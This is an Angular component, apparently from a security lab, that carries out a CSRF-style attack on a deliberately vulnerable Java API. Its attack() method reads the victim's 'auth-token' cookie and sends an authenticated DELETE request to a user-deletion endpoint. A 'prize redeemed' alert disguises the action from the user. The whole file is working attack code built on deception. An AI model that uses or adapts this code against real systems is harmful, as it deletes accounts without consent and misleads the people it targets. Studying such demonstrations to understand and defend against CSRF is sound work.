import { Component } from '@angular/core';
import { HttpClient, HttpHeaders } from '@angular/common/http';

@Component({
  selector: 'app-attack',
  templateUrl: './attack.component.html',
  styleUrls: ['./attack.component.css']
})
export class AttackComponent {
  constructor(private http: HttpClient) {}

  attack() {
    const token = this.getCookie("auth-token");
    const headers = new HttpHeaders().set('Authorization', `Bearer ${token}`);
  
    this.http.delete('https://java-vuln-api.onrender.com/auth/deluser/f9252b24-586f-48ac-9132-204843577251', {
      headers,
      withCredentials: true
    }).subscribe({
      next: () => alert('Prêmio resgatado com sucesso!'),
      error: (err) => console.error('Erro no ataque CSRF:', err)
    });
  }

  // getCookie(name: string): string | null {
  //   const value = `; ${document.cookie}`;
  //   const parts = value.split(`; ${name}=`);
  //   if (parts.length === 2) return parts.pop()?.split(';').shift() || null;
  //   return null;
  // }
  getCookie(name: string): string | null {
      const cookies = document.cookie.split('; ');
      for (const cookie of cookies) {
        const [key, value] = cookie.split('=');
        if (key === name) {
          return value;
        }
      }
      return null;
  }    
}